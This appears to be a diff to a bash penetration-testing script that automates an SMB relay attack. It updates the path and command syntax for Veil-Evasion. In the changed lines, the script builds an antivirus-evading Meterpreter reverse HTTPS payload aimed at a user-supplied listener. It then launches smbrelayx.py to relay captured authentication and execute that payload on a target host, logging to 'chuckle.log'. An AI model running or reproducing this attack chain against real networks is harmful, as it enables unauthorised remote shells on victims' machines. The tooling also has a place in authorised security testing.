@@ -27,10 +27,12 @@ echo -e '\n'
 # slash configuration and fixed
 RESPONDER=`which responder`
 NMAP=`which nmap`
-VEIL=/hacklabs/pentest/deps/Veil/Veil-Evasion/Veil-Evasion.py
 SMBRELAY=`which smbrelayx.py`
 MSFCONSOLE=`which msfconsole`
 NBTSCAN=`which nbtscan`
+
+# [!] Insert your Veil path
+VEIL=/opt/Veil
 
 # print nbt name, slow on big networks
 # valid values: 0 1
@@ -39,9 +41,10 @@ shownbt=1
 echo "Checking dependencies..."
 command -v $RESPONDER >/dev/null 2>&1 || { echo "responder is required but not installed.  Aborting." >&2; exit 1; }
 command -v $NMAP >/dev/null 2>&1 || { echo "nmap is required but not installed.  Aborting." >&2; exit 1; }
-command -v $VEIL >/dev/null 2>&1 || { echo "veil-evasion is required but not installed.  Aborting." >&2; exit 1; }
 command -v $SMBRELAY >/dev/null 2>&1 || { echo "smbrelayx.py is required but not installed.  Aborting." >&2; exit 1; }
 command -v $MSFCONSOLE >/dev/null 2>&1 || { echo "msfconsole required but not installed.  Aborting." >&2; exit 1; }
+command -v $VEIL/Veil.py >/dev/null 2>&1 || { echo "veil not found, Aborting. Edit this script and add a correct path." >&2; exit 1; }
+
 
 #determine which version of Responder is being used.
 if responder --version|grep 2.1>/dev/null; then
@@ -122,9 +125,9 @@ done
 echo "Please enter local port for reverse connection:"
 read port
 echo "Meterpreter shell will connect back to $lhost on port $port"
-echo "Generating Payload..."
-payload=$($VEIL -p cs/meterpreter/rev_https -c LHOST=$lhost LPORT=$port -o $target 2>/dev/null|grep exe |cut -d " " -f6|sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g")
-echo "Payload created: $payload"
+if [ -z "$target" ] ; then target="target-undef" ; fi
+payload=$( cd $VEIL ; ./Veil.py -t Evasion -p cs/meterpreter/rev_https.py --ip $lhost --port $port -o $target |grep exe |cut -d " " -f6|sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|  K]//g")
+echo "Payload loaded: $payload"
 echo "Starting SMBRelayX and targetting $target with the payload $payload"
 $SMBRELAY -h $tmptarget -e $payload  >> ./chuckle.log  &
 sleep 2
